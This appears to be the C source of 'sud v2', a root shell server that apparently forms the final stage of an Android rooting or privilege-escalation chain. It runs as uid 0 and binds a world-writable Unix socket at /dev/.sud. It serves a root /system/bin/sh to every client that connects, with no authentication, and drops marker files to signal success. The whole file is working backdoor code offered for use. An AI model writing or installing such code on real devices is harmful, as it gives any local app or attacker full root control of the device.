/* sud v2: uid-0 shell server, runs IN the stage worker (the worker
 * execve()s this binary directly: no second clone exists to hang).
 *
 * Why this shape: every post-hook clone/fork risks hanging D-state in
 * copy_process under o1s reclaim storms (proven: sud-clone hangs some
 * boots while grandchild-clone flies). This design has ZERO forks on
 * the critical path: hook -> worker -> grandchild (ko) -> worker execs
 * sud -> sud serves. Per-client shells still fork+exec+waitpid, but that
 * happens later, on demand, sequentially (one client at a time).
 *
 * Inherits uid 0 from the worker. Binds /dev/.sud (0777), marks
 * /dev/dfm0 once serving (= SUCCESS signal for the app), serves
 * /system/bin/sh per connection, waits each shell (no zombies).
 */
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

/* v57: pure daemon (worker loads ko via grandchild first). */
/* v57: pure daemon (worker loads ko via grandchild first). */
#define SOCK_PATH "/dev/.sud"
#define SHELL_PATH "/system/bin/sh"
#define MARK_PATH "/dev/dfm0"

static void mark_path(const char *p)
{
	int fd = open(p, O_WRONLY | O_CREAT | O_CLOEXEC, 0420);

	if (fd >= 0)
		close(fd);
}


int main(void)
{
	int fd, c;
	struct sockaddr_un a;

	signal(SIGCHLD, SIG_DFL);
	memset(&a, 0, sizeof(a));
	a.sun_family = AF_UNIX;
	strcpy(a.sun_path, SOCK_PATH);
	unlink(a.sun_path);
	/* socket itself can fail transiently under pressure: retry. */
	do {
		fd = socket(AF_UNIX, SOCK_STREAM, 0);
		if (fd < 0)
			sleep(2);
	} while (fd < 0);
	mark_path(MARK_PATH); /* main running (bind may still lag) */
	/* bind may fail if ko-permissive hasn't landed yet: bounded retry
	 * (500 x 100ms = 50s). Timeout -> mark dfBT + exit (never hang blind).
	 */
	{
		int i;
		for (i = 0; i < 500; i++) {
			if (bind(fd, (struct sockaddr *)&a, sizeof(a)) == 0)
				break;
			usleep(100000);
		}
		if (i >= 500) {
			mark_path("/dev/dfBT");
			return 1;
		}
	}
	chmod(a.sun_path, 0777);
	if (listen(fd, 4) < 0) {
		mark_path("/dev/dfLI");
		return 1;
	}
	for (;;) {
		pid_t p;
		int st;

		c = accept(fd, 0, 0);
		if (c < 0)
			continue;
		p = fork();
		if (p == 0) {
			dup2(c, 0);
			dup2(c, 1);
			dup2(c, 2);
			if (c > 2)
				close(c);
			close(fd);
			execl(SHELL_PATH, "sh", (char *)0);
			_exit(127);
		}
		close(c);
		if (p > 0) {
			while (waitpid(p, &st, 0) < 0)
				;
		}
	}
	return 0;
}
